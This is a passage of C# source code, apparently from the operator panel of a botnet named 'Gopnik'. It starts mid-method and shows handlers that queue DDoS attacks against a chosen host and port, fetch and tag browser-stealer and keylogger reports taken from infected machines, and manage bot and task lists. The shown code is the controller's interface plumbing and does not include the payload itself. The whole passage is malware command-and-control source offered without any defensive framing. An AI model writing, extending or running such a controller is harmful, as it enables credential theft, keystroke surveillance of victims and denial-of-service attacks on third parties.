        		new Thread(() => m_GopnikClient.AddDdos(strArguments)).Start();
        	}
        	catch {}
        }
        #endregion

        #region GET_BROWSER_REPORT_LIST
        public void GetStealerlist(int iPage)
        {
            try
            {
                new Thread(delegate()
                    {
                        m_GopnikClient.GetBrowserStealer(iPage);
                    }).Start();
            }
            catch
            {

            }
        }
        #endregion

        #region Get_KEYLOGGER_REPORT_LIST
        public void GetKeyloggerList(int iPage)
        {
            try
            {
                new Thread(delegate() { m_GopnikClient.GetKeyloggerList(iPage); }).Start();
            }
            catch { }
        }
        #endregion

        #region GET_KEYLOGGER_REPORT
        public void GetKeyloggerReport(int iID)
        {
            try
            {
                new Thread(delegate() { m_GopnikClient.GetKeylogReport(iID); }).Start();
            }
            catch { }
        }
        #endregion

        #region ENABLE_DISABLE_CONTROLS
        void EnableControls(Boolean bEnable)
        {
            if (!this.m_GopnikClient.IsRunning()) return;

            if (this.m_frmMain == null) return;

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                if (m_frmMain.gcBotlist.Enabled == !bEnable) m_frmMain.gcBotlist.Enabled = bEnable;
                if (m_frmMain.gcTasklist.Enabled == !bEnable) m_frmMain.gcTasklist.Enabled = bEnable;
                if (m_frmMain.gcStealerList.Enabled == !bEnable) m_frmMain.gcStealerList.Enabled = bEnable;
                if (m_frmMain.gcKeyloggerList.Enabled == !bEnable) m_frmMain.gcKeyloggerList.Enabled = bEnable;
                if (m_frmMain.cbTask.Enabled == !bEnable) m_frmMain.cbTask.Enabled = bEnable;
                if (m_frmMain.txtTaskParameters.Enabled == !bEnable) m_frmMain.txtTaskParameters.Enabled = bEnable;
                if (m_frmMain.txtTaskExecutes.Enabled == !bEnable) m_frmMain.txtTaskExecutes.Enabled = bEnable;
                if (m_frmMain.btnAddTask.Enabled == !bEnable) m_frmMain.btnAddTask.Enabled = bEnable;
                if (m_frmMain.lblCurrentBotPage.Enabled == !bEnable) m_frmMain.lblCurrentBotPage.Enabled = bEnable;
                if (m_frmMain.btnNextBotlistPage.Enabled == !bEnable) m_frmMain.btnNextBotlistPage.Enabled = bEnable;
                if (m_frmMain.btnPreviousBotlistPage.Enabled == !bEnable) m_frmMain.btnPreviousBotlistPage.Enabled = bEnable;
                if (m_frmMain.gcDdosList.Enabled == !bEnable) m_frmMain.gcDdosList.Enabled = bEnable;
                if (m_frmMain.cbAttackType.Enabled == !bEnable) m_frmMain.cbAttackType.Enabled = bEnable;
                if (m_frmMain.txtAttackHost.Enabled == !bEnable) m_frmMain.txtAttackHost.Enabled = bEnable;
                if (m_frmMain.txtAttackPort.Enabled == !bEnable) m_frmMain.txtAttackPort.Enabled = bEnable;
                if (m_frmMain.btnStartAttack.Enabled == !bEnable) m_frmMain.btnStartAttack.Enabled = bEnable;
                if (m_frmMain.cbEnableDdosTimeConfiguration.Enabled == !bEnable) m_frmMain.cbEnableDdosTimeConfiguration.Enabled = bEnable;
                if (m_frmMain.txtKeylogSearchTags.Enabled == !bEnable) m_frmMain.txtKeylogSearchTags.Enabled = bEnable;
                if (m_frmMain.txtStealerSearchTags.Enabled == !bEnable) m_frmMain.txtStealerSearchTags.Enabled = bEnable;
                if (m_frmMain.btnSearchBrowserStealer.Enabled == !bEnable) m_frmMain.btnSearchBrowserStealer.Enabled = bEnable;
                if (m_frmMain.btnSearchKeylogs.Enabled == !bEnable) m_frmMain.btnSearchKeylogs.Enabled = bEnable;
                if (m_frmMain.txtDdosSockets.Enabled == !bEnable) m_frmMain.txtDdosSockets.Enabled = bEnable;
                if (m_frmMain.txtDdosInterval.Enabled == !bEnable) m_frmMain.txtDdosInterval.Enabled = bEnable;

                if (!bEnable)
                {
                    this.CleanBotlist();
                    this.CleanTasklist();
                    this.CleanDdoslist();
                    this.CleanBrowserStealer();
                    this.CleanKeylogReports();

                    this.SetBotnetname("N/A");

                    Program.ControllerConfig.CurrentBotPage = 0;
                    Program.ControllerConfig.TotalBotPages = 0;
                    Program.ControllerConfig.TotalBots = 0;
                    Program.ControllerConfig.TotalTasks = 0;
                    Program.ControllerConfig.TotalStealerPages = 0;
                    Program.ControllerConfig.TotalKeylogPages = 0;

                    Program.ControllerConfig.TotalBots = 0;
                    Program.ControllerConfig.OnlineTotal = 0;
                    Program.ControllerConfig.TotalDdos = 0;
                    Program.ControllerConfig.TotalTasks = 0;
                    Program.ControllerConfig.TotalKeylog = 0;
                    Program.ControllerConfig.TotalBrowserStealer = 0;
                }
            });
        }
        #endregion

        #region SET_BOTNET_NAME
        void SetBotnetname(String strBotnetname)
        {
            if (!this.m_GopnikClient.IsRunning()) return;

            if(m_frmMain != null)
            {
                m_frmMain.Invoke((MethodInvoker)delegate()
                {
                    CUtils.ReplaceRowCellValue(m_frmMain.gvStatistics, "Botnet name", "Value", strBotnetname);
                });
            }
        }
        #endregion

        #region SET_STATUS
        void SetStatus(String strStatus)
        {
            if (this.m_GopnikClient.IsRunning() == false) return;

            if(m_frmMain != null)
            {
                m_frmMain.Invoke((MethodInvoker)delegate()
                {
                    m_frmMain.lblStatus.Caption = string.Format("Status: {0}", strStatus);
                });
            }
        }
        #endregion

        #region CLEAN_TASK_LIST
        void CleanTasklist()
        {
            m_TasklistData.Rows.Clear();
        }
        #endregion

        #region CLEAN_BOT_LIST
        void CleanBotlist()
        {
            m_BotlistData.Rows.Clear();
        }
        #endregion

        #region CLEAN_DDOS_LIST
        void CleanDdoslist()
        {
            m_DdosListData.Rows.Clear();
        }
        #endregion

        #region CLEAN_BROWSER_REPORTS_LIST
        void CleanBrowserStealer()
        {
            m_StealerListData.Rows.Clear();
        }
        #endregion

        #region CLEAN_KEYLOG_REPORTS_LIST
        void CleanKeylogReports()
        {
            m_KeyloggerListData.Rows.Clear();
        }
        #endregion

        #region SET_BROWSER_STEALER_TAG
        public void SetBrowserStealerTag(string strTag)
        {
            try
            {
                new Thread(delegate()
                    {
                        m_GopnikClient.SetBrowserStealerTag(strTag);
                    }).Start();
            }
            catch { }
        }
        #endregion

        #region SET_KEYLOG_TAG
        public void SetKeylogTag(string strTag)
        {
            try
            {
                new Thread(delegate()
                    {
                        m_GopnikClient.SetKeyloggerTag(strTag);
                    }).Start();
            }
            catch { }
        }
        #endregion

    }
}
